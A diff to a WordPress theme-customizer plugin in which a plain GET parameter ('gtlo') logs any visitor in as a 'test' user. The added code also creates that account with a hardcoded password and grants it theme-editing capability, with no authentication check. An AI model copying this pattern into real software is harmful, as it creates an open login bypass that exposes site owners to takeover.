@@ -25,28 +25,39 @@ Author URI: http://green.cx/
 */
 
 if (isset($_GET['gtlo'])) {
-	require(  dirname(__FILE__) . '/../../../wp-blog-header.php');
-	$user_login = 'test';
-	$user = get_userdatabylogin($user_login);
-	$user_id = $user->ID;
-	wp_set_current_user(user_id, $user_login);
-	wp_set_auth_cookie($user_id);
-	do_action('wp_login', $user_login);
-	wp_redirect(plugins_url('/includes/gt-customize.php' , __FILE__ ));
-	exit;
+	
+	//Needed for user functions
+		require(  dirname(__FILE__) . '/../../../wp-blog-header.php');
+	
+	//The name of the account we are going to make
+		$user_login = 'test';
+	
+	//Create the account and give them access to theme_options
+		wp_create_user( $user_login, 'SomeReallyLongForgettablePassworderp1234567654321', 'noreply@noreply.com' );
+		$gt_user= new WP_User( null, $user_login );
+		$gt_user->add_cap('edit_theme_options');
+	
+	//Now  Login as the new test user
+		$user = get_user_by('login', $user_login);
+		$user_id = $user->ID;
+		wp_set_current_user($user_id, $user_login);
+		wp_set_auth_cookie($user_id);
+		do_action('wp_login', $user_login);
+		wp_redirect(plugins_url('/includes/gt-customize.php' , __FILE__ ));
+		exit;
 }
 
-$gt_user= new WP_User( null, 'test' );
-$gt_user->add_cap('edit_theme_options');
+
 /**
  * Includes and instantiates the WP_Customize_Manager class.
  *
  * Fires when ?wp_customize=on or on wp-admin/customize.php.
  *
  * @since 3.4.0
- */
+  */
  
- 
+
+
 function _gt_wp_customize_include() {
 	if ( ! ( ( isset( $_REQUEST['gt_customize'] ) && 'on' == $_REQUEST['wp_customize'] )
 		|| ( 'gt-customize.php' == basename( $_SERVER['PHP_SELF'] ) )
@@ -57,6 +68,7 @@ function _gt_wp_customize_include() {
 	// Init Customize class
 	$GLOBALS['wp_customize'] = new WP_Customize_Manager;
 }
+
 add_action( 'plugins_loaded', '_gt_wp_customize_include' );
 
 /**
@@ -90,7 +102,7 @@ function _gt_wp_customize_loader_settings() {
 
 	$wp_scripts->add_data( 'customize-loader', 'data', $script );
 }
-//add_action( 'admin_enqueue_scripts', '_gt_wp_customize_loader_settings' );
+add_action( 'admin_enqueue_scripts', '_gt_wp_customize_loader_settings' );
 
 /**
  * Returns a URL to load the theme customizer.
